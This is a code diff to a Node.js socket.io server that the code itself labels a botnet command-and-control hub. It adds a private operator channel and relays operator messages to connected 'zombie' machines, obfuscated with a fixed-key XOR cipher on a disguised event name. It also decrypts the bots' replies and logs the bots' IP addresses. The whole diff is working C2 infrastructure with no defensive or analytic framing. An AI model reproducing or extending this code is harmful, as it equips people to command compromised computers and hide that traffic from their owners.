@@ -50,10 +50,58 @@ app.listen(port);
 var io = require('socket.io')(http);
 
 
-io.on('connection', function(socket){
- var clientIp = socket.request.connection.remoteAddress;
+
+//start encryption xor
+
+function encryptDecrypt(input) {
+	var key = ['K', 'C', 'Q']; //Can be any chars, and any size array
+	var output = [];
+	
+	for (var i = 0; i < input.length; i++) {
+		var charCode = input.charCodeAt(i) ^ key[i % key.length].charCodeAt(0);
+		output.push(String.fromCharCode(charCode));
+	}
+	return output.join("");
+}
+
+
+
+
+//c&c room
+var nsp = io.of('/private');
+
+nsp.on('connection', function(socket){
+
+
+var clientIp = socket.request.connection.remoteAddress;
 var clientIp = clientIp.slice(7);
-io.emit('zombiename', clientIp);
+
+console.log('someone connected');
+nsp.emit('zombie name', clientIp);
+nsp.emit('chat message', 'Hello everyone!');
+
+
+socket.on( 'chat message', function( msg ){
+
+nsp.emit( 'chat message', msg, socket.id ); // pass the socket.id so other client know who it's from
+
+io.emit('jnkcyp', encryptDecrypt(msg));
+});
+});
+
+
+io.on('connection', function(socket){
+var clientIp = socket.request.connection.remoteAddress;
+var clientIp = clientIp.slice(7);
+
+
+var encryptIP = encryptDecrypt(clientIp);
+var decryptIP = encryptDecrypt(encryptIP);
+
+console.log("decrypted IP: " + decryptIP)
+
+nsp.emit('zombiename', clientIp);
+console.log('Socket ID: ', socket.id);
 
 console.log('Zombie Connected: ' + clientIp);
 socket.on('disconnect', function(){
@@ -61,11 +109,20 @@ console.log('Zombie Disconnected');
 
 });
 
-  socket.on('chat message', function(msg){
-    io.emit('chat message', clientIp + ": " +  msg);
- });
 
+
+
+//decrypts bot message
+socket.on('jnkcyp', function(msg){
+
+var decrypted = encryptDecrypt(msg);
+nsp.emit('chat message', decrypted);
+
+
+ });
   });
+
+
 
 
 http.listen(80, function(){
